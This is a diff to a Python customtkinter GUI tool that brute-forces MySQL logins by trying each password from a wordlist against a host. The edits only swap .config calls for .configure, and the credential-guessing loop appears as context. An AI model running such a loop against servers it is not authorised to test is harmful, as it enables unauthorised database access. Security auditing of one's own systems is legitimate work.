@@ -1,4 +1,3 @@
-import tkinter as tk
 from tkinter import filedialog
 import customtkinter as ctk
 import threading
@@ -29,7 +28,7 @@ def brute_force_mysql(host, user, wordlist_path, output_label, delay=0):
         with open(wordlist_path, 'r', encoding='utf-8') as file:
             for password in file:
                 password = password.strip()
-                output_label.config(text=f"Current attempt: {password}")
+                output_label.configure(text=f"Current attempt: {password}")
                 try:
                     connection = mysql.connector.connect(
                         host=host,
@@ -38,13 +37,13 @@ def brute_force_mysql(host, user, wordlist_path, output_label, delay=0):
                     )
                     if connection.is_connected():
                         connection.close()
-                        output_label.config(text=f"Password found: {password}, Complexity: {classify_password(password)}")
+                        output_label.configure(text=f"Password found: {password}, Complexity: {classify_password(password)}")
                         return
                 except mysql.connector.Error:
                     time.sleep(delay)
-        output_label.config(text="Password not found or error occurred")
+        output_label.configure(text="Password not found or error occurred")
     except Exception as e:
-        output_label.config(text=f"Error: {e}")
+        output_label.configure(text=f"Error: {e}")
 
 # GUI Setup
 def setup_gui():
